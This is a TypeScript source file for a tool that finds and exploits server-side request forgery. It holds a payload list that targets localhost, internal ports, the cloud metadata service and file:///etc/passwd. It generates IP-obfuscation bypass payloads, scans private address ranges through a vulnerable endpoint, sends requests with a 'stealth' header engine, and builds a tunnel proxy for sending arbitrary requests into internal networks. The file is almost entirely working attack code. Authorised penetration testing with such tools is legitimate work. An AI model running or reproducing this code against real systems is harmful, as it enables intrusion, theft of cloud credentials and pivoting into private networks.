/**
 * SSRFProbe.tsx — Server-Side Request Forgery Detection & Exploitation Engine
 *
 * Advanced SSRF testing with payload generation, internal network scanning,
 * response analysis, and vulnerable endpoint tunneling.
 */

import axios from "axios";
import { URL } from "url";
import dns from "dns/promises";
import pLimit from "p-limit";
import stealthEngine from "../src/runtime/stealthEngine";
import { logger } from "../src/runtime/logger";

const INTERNAL_RANGES: RegExp[] = [
  /^10\./,
  /^172\.(1[6-9]|2[0-9]|3[01])\./,
  /^192\.168\./,
  /^127\./,
  /^169\.254\./,
  /^fc00:/,
  /^fe80:/,
  /^::1$/,
  /^0\.0\.0\.0$/,
  /localhost/i,
  /metadata\.google\.internal/i,
  /169\.254\.169\.254/,
];

const SSRF_PAYLOADS: readonly string[] = [
  "http://127.0.0.1",
  "http://localhost",
  "http://0.0.0.0",
  "http://127.0.0.1:22",
  "http://127.0.0.1:3306",
  "http://127.0.0.1:6379",
  "http://127.0.0.1:8080",
  "http://169.254.169.254/latest/meta-data/",
  "http://169.254.169.254/1.0/meta-data/",
  "file:///etc/passwd",
  "file:///c:/windows/system32/drivers/etc/hosts",
  "http://127.0.0.1@example.com",
  "http://example.com@127.0.0.1",
  "http://127.1",
  "http://2130706433",
  "http://0x7f000001",
  "http://[::1]:8080",
  "http://127.0.0.1.%20.1.xip.io/",
  "http://127.0.0.1.nip.io",
];

interface SSRFTestResult {
  payload: string;
  status?: number;
  length?: number;
  elapsed: number;
  vulnerable: boolean;
  confidence: number;
  notes?: string[];
  error?: string;
}

interface FoundEndpoint {
  url: string;
  param: string;
  payload: string;
  confidence: number;
}

interface DiscoveredHost {
  ip: string;
  port: number;
  alive: boolean;
}

interface TunnelResponse {
  success: boolean;
  status?: number;
  headers?: any;
  data?: Buffer;
  via?: string;
  error?: string;
  message?: string;
}

interface InternalHostCheck {
  internal: boolean;
  ip?: string;
  family?: string;
  error?: boolean;
}

class SSRFProbe {
  private timeout: number;
  private maxRedirects: number;
  private foundEndpoints: FoundEndpoint[];
  private openPorts: DiscoveredHost[];

  constructor(options: { timeout?: number } = {}) {
    this.timeout = options.timeout || 3000;
    this.maxRedirects = 0;
    this.foundEndpoints = [];
    this.openPorts = [];
  }

  async testEndpoint(
    targetUrl: string,
    paramName: string,
    paramValue?: string,
  ): Promise<SSRFTestResult[]> {
    const results: SSRFTestResult[] = [];
    const originalUrl = new URL(targetUrl);

    for (const payload of SSRF_PAYLOADS) {
      try {
        const testUrl = new URL(targetUrl);
        testUrl.searchParams.set(paramName, payload);

        const start = Date.now();

        const response = await axios.get(testUrl.toString(), {
          headers: stealthEngine.getTacticalHeaders(),
          timeout: this.timeout,
          maxRedirects: this.maxRedirects,
          validateStatus: () => true,
        });

        const elapsed = Date.now() - start;

        const vulnStatus = this.analyzeResponse(response, payload, elapsed);

        const result: SSRFTestResult = {
          payload,
          status: response.status,
          length: response.headers["content-length"]
            ? parseInt(response.headers["content-length"] as string)
            : response.data?.length || 0,
          elapsed,
          vulnerable: vulnStatus.vulnerable,
          confidence: vulnStatus.confidence,
          notes: vulnStatus.notes,
        };

        results.push(result);

        if (vulnStatus.vulnerable) {
          this.foundEndpoints.push({
            url: testUrl.toString(),
            param: paramName,
            payload,
            confidence: vulnStatus.confidence,
          });
        }
      } catch (err: any) {
        const result: SSRFTestResult = {
          payload,
          elapsed: 0,
          vulnerable: err.code === "ECONNREFUSED",
          confidence: err.code === "ECONNREFUSED" ? 70 : 0,
          error: err.code,
          notes: [
            err.code === "ECONNREFUSED"
              ? "Server reached but port closed"
              : err.message,
          ],
        };
        results.push(result);
      }
    }

    return results;
  }

  private analyzeResponse(response: any, payload: string, elapsed: number) {
    const result = {
      vulnerable: false,
      confidence: 0,
      notes: [] as string[],
    };

    if (
      response.status === 200 &&
      elapsed > 100 &&
      response.data?.length > 100
    ) {
      result.vulnerable = true;
      result.confidence = 90;
      result.notes.push("Full response received from internal endpoint");
    }

    if (response.status === 401 || response.status === 403) {
      result.vulnerable = true;
      result.confidence = 85;
      result.notes.push(
        "Internal service responded with authentication required",
      );
    }

    if (response.status === 500 && elapsed < 200) {
      result.confidence = 30;
      result.notes.push(
        "Server error occurred (may indicate successful connection)",
      );
    }

    if (elapsed > 2000) {
      result.confidence += 15;
      result.notes.push("Long response time indicates remote side processing");
    }

    if (response.headers?.server) {
      const serverHeader = response.headers.server.toLowerCase();
      if (/apache|nginx|tomcat|mysql|redis/.test(serverHeader)) {
        result.confidence += 10;
        result.notes.push(
          `Identified internal service: ${response.headers.server}`,
        );
      }
    }

    return result;
  }

  async scanInternalNetwork(
    baseEndpoint: string,
    paramName: string,
  ): Promise<any[]> {
    const results: any[] = [];
    const limit = pLimit(10); // Scan 10 ports/ips at once

    const scanRanges = ["192.168.0.", "10.0.0.", "172.16.0."];
    const commonPorts = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9000, 9200];

    const tasks: any[] = [];

    for (const range of scanRanges) {
      for (let i = 1; i <= 20; i++) {
        const targetIp = `${range}${i}`;
        for (const port of commonPorts) {
          tasks.push(
            limit(async () => {
              const payload = `http://${targetIp}:${port}`;
              const testUrl = new URL(baseEndpoint);
              testUrl.searchParams.set(paramName, payload);
              try {
                const start = Date.now();
                await axios.get(testUrl.toString(), {
                  headers: stealthEngine.getTacticalHeaders(),
                  timeout: 5000,
                  maxRedirects: 0,
                  validateStatus: () => true,
                });
                const elapsed = Date.now() - start;
                if (elapsed < 1000) {
                  this.openPorts.push({ ip: targetIp, port, alive: true });
                  return { ip: targetIp, port, status: "open" };
                }
              } catch (err: any) {
                if (err.code === "ECONNREFUSED") {
                  return {
                    ip: targetIp,
                    port,
                    status: "host_up_port_closed",
                  };
                }
              }
              return null;
            }),
          );
        }
      }
    }

    const scanResults = await Promise.all(tasks);
    results.push(...scanResults.filter((r) => r !== null));
    return results;
  }

  generateBypassPayloads(targetIp: string): string[] {
    return [
      `http://${targetIp}`,
      `http://${targetIp}/`,
      `http://${targetIp}#.example.com`,
      `http://${targetIp}?example.com`,
      `http://${targetIp}.xip.io`,
      `http://${targetIp}.nip.io`,
      `http://${encodeURIComponent(targetIp)}`,
      `http://${targetIp.replace(/\./g, "%2e")}`,
    ];
  }

  async isInternalHost(hostname: string): Promise<InternalHostCheck> {
    try {
      const addresses = await dns.lookup(hostname, { all: true });

      for (const addr of addresses) {
        for (const range of INTERNAL_RANGES) {
          if (range.test(addr.address)) {
            return {
              internal: true,
              ip: addr.address,
              family: String(addr.family),
            };
          }
        }
      }

      return { internal: false };
    } catch {
      return { internal: false, error: true };
    }
  }

  getFindings() {
    return {
      vulnerableEndpoints: this.foundEndpoints,
      discoveredHosts: this.openPorts,
      totalTests: SSRF_PAYLOADS.length,
    };
  }

  createTunnelProxy(vulnerableEndpoint: string, paramName: string) {
    const self = this;

    return {
      async forward(
        method: string,
        internalUrl: string,
        headers: Record<string, string> = {},
        body: any = null,
      ): Promise<TunnelResponse> {
        const proxyUrl = new URL(vulnerableEndpoint);
        proxyUrl.searchParams.set(paramName, internalUrl);

        try {
          const response = await axios({
            method: method.toLowerCase(),
            url: proxyUrl.toString(),
            headers,
            data: body,
            timeout: 10000,
            maxRedirects: 0,
            validateStatus: () => true,
            responseType: "arraybuffer",
          });

          return {
            success: true,
            status: response.status,
            headers: response.headers,
            data: response.data,
            via: vulnerableEndpoint,
          };
        } catch (err: any) {
          return {
            success: false,
            error: err.code,
            message: err.message,
          };
        }
      },

      async get(internalUrl: string) {
        return this.forward("GET", internalUrl);
      },

      async post(internalUrl: string, body: any) {
        return this.forward("POST", internalUrl, {}, body);
      },

      async head(internalUrl: string) {
        return this.forward("HEAD", internalUrl);
      },
    };
  }
}

// Static properties (for backward compatibility)
const SSRFProbeAny = SSRFProbe as any;
SSRFProbeAny.PAYLOADS = SSRF_PAYLOADS;
SSRFProbeAny.INTERNAL_RANGES = INTERNAL_RANGES;

export default SSRFProbe;
